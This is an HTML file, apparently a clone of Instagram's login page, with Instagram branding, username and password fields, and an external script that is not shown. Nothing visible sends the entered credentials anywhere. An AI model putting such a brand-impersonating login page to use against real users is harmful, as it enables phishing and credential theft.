<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="phone">
            <img src="https://www.instagram.com/static/images/homepage/screenshots/screenshot1-2x.png/71462acb593e.png" alt="Instagram phone">
        </div>
        <div class="form-container">
            <div class="login-form">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
                <form id="loginForm">
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                <div class="or">
                    <div class="line"></div>
                    <div class="text">OR</div>
                    <div class="line"></div>
                </div>
                <div class="login-with-facebook">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook icon">
                    <a href="#">Log in with Facebook</a>
                </div>
                <a href="#" class="forgot-password">Forgot password?</a>
            </div>
            <div class="signup">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            <div class="get-the-app">
                <p>Get the app.</p>
                <div class="app-links">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Play_Store_badge_EN.svg/512px-Play_Store_badge_EN.svg.png" alt="App Store">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Get_it_on_Google_play.svg/512px-Get_it_on_Google_play.svg.png" alt="Google Play">
                </div>
            </div>
        </div>
    </div>
    <script src="scripts.js"></script>
</body>
</html>
